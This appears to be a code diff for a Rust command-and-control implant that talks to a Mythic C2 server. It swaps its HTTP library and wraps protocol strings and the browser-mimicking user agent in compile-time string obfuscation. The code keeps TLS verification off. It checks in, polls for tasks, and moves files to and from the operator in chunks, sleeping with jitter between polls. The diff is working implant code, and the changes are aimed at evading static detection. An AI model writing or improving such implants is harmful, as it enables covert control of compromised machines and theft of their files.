@@ -129,13 +129,18 @@ pub struct PostResponseMessage<'a> {
 
 // ── HTTP client ────────────────────────────────────────────────────────────────
 
-pub fn build_client() -> reqwest::blocking::Client {
-    reqwest::blocking::Client::builder()
-        .danger_accept_invalid_certs(true)
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        .timeout(std::time::Duration::from_secs(30))
-        .build()
-        .expect("reqwest client init failed")
+pub fn build_client() -> ureq::Agent {
+    use std::time::Duration;
+    let tls = ureq::tls::TlsConfig::builder()
+        .disable_verification(true)
+        .build();
+    let ua = obfstr::obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36").to_string();
+    let config = ureq::config::Config::builder()
+        .timeout_global(Some(Duration::from_secs(30)))
+        .user_agent(ua)
+        .tls_config(tls)
+        .build();
+    ureq::Agent::new_with_config(config)
 }
 
 // ── AES-256-CBC + HMAC-SHA256 (Mythic standard) ───────────────────────────────
@@ -382,27 +387,27 @@ const CHUNK_SIZE: usize = 512_000;
 
 /// Send a post_response message to Mythic and parse the response entries.
 fn send_post_response(
-    client: &reqwest::blocking::Client,
+    client: &ureq::Agent,
     base_url: &str,
     uri: &str,
     callback_id: &str,
     key: &[u8; 32],
     responses: Vec<TaskResponse>,
 ) -> Vec<PostResponseEntry> {
+    let action = obfstr::obfstr!("post_response").to_string();
     let msg = PostResponseMessage {
-        action: "post_response",
+        action: &action,
         responses,
     };
     let json = serde_json::to_string(&msg).unwrap_or_default();
     let wire = build_mythic_message(callback_id, &json, key);
 
     client
-        .post(format!("{}{}", base_url, uri))
-        .body(wire)
-        .header("Content-Type", "application/octet-stream")
-        .send()
+        .post(&format!("{}{}", base_url, uri))
+        .content_type("application/octet-stream")
+        .send(&wire)
         .ok()
-        .and_then(|r| r.text().ok())
+        .and_then(|mut r| r.body_mut().read_to_string().ok())
         .and_then(|raw| parse_mythic_message(&raw, key))
         .and_then(|j| serde_json::from_str::<PostResponse>(&j).ok())
         .map(|r| r.responses)
@@ -411,7 +416,7 @@ fn send_post_response(
 
 /// Download a file from the agent to Mythic using chunked transfer protocol.
 pub fn mythic_download(
-    client: &reqwest::blocking::Client,
+    client: &ureq::Agent,
     base_url: &str,
     uri: &str,
     callback_id: &str,
@@ -494,7 +499,7 @@ pub fn mythic_download(
 
 /// Upload a file from Mythic to the agent using chunked transfer protocol.
 pub fn mythic_upload(
-    client: &reqwest::blocking::Client,
+    client: &ureq::Agent,
     base_url: &str,
     uri: &str,
     callback_id: &str,
@@ -675,8 +680,9 @@ pub fn run_c2_loop<F>(
     let uri = if callback_uri.is_empty() { "/" } else { callback_uri };
 
     // ── Checkin ───────────────────────────────────────────────────────────────
+    let checkin_action = obfstr::obfstr!("checkin").to_string();
     let checkin = CheckinMessage {
-        action: "checkin",
+        action: &checkin_action,
         uuid: payload_uuid,
         user: reg.user.clone(),
         host: reg.host.clone(),
@@ -701,13 +707,12 @@ pub fn run_c2_loop<F>(
         if should_exit() {
             return;
         }
-        if let Ok(resp) = client
-            .post(format!("{}{}", base, uri))
-            .body(checkin_msg.clone())
-            .header("Content-Type", "application/octet-stream")
-            .send()
+        if let Ok(mut resp) = client
+            .post(&format!("{}{}", base, uri))
+            .content_type("application/octet-stream")
+            .send(&checkin_msg)
         {
-            if let Ok(raw) = resp.text() {
+            if let Ok(raw) = resp.body_mut().read_to_string() {
                 if let Some(json) = parse_mythic_message(&raw, &encryption_key) {
                     if let Ok(cr) = serde_json::from_str::<CheckinResponse>(&json) {
                         if cr.status == "success" {
@@ -728,19 +733,19 @@ pub fn run_c2_loop<F>(
             break;
         }
 
+        let gt_action = obfstr::obfstr!("get_tasking").to_string();
         let get_tasking = GetTaskingMessage {
-            action: "get_tasking",
+            action: &gt_action,
             tasking_size: -1,
         };
         let get_json = serde_json::to_string(&get_tasking).unwrap_or_default();
         let get_msg = build_mythic_message(&callback_id, &get_json, &encryption_key);
 
         let tasks: Vec<Task> = match client
-            .post(format!("{}{}", base, uri))
-            .body(get_msg)
-            .header("Content-Type", "application/octet-stream")
-            .send()
-            .and_then(|r| r.text())
+            .post(&format!("{}{}", base, uri))
+            .content_type("application/octet-stream")
+            .send(&get_msg)
+            .and_then(|mut r| r.body_mut().read_to_string())
         {
             Ok(raw) => parse_mythic_message(&raw, &encryption_key)
                 .and_then(|j| serde_json::from_str::<GetTaskingResponse>(&j).ok())
@@ -766,7 +771,7 @@ pub fn run_c2_loop<F>(
 
             // Download and upload use Mythic's chunked file transfer protocol
             // and require multiple round-trips — handle them outside of dispatch.
-            if task.command == "download" {
+            if task.command == obfstr::obfstr!("download") {
                 let path = extract_param(&task.parameters, "path");
                 let output = mythic_download(
                     &client, &base, uri, &callback_id, &encryption_key,
@@ -783,7 +788,7 @@ pub fn run_c2_loop<F>(
                 });
                 continue;
             }
-            if task.command == "upload" {
+            if task.command == obfstr::obfstr!("upload") {
                 let file_id = extract_param(&task.parameters, "file");
                 let dest = extract_param(&task.parameters, "remote_path");
                 let output = mythic_upload(
@@ -814,18 +819,18 @@ pub fn run_c2_loop<F>(
             });
         }
 
+        let pr_action = obfstr::obfstr!("post_response").to_string();
         let post_resp = PostResponseMessage {
-            action: "post_response",
+            action: &pr_action,
             responses,
         };
         let post_json = serde_json::to_string(&post_resp).unwrap_or_default();
         let post_msg = build_mythic_message(&callback_id, &post_json, &encryption_key);
 
         let _ = client
-            .post(format!("{}{}", base, uri))
-            .body(post_msg)
-            .header("Content-Type", "application/octet-stream")
-            .send();
+            .post(&format!("{}{}", base, uri))
+            .content_type("application/octet-stream")
+            .send(&post_msg);
 
         sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
     }
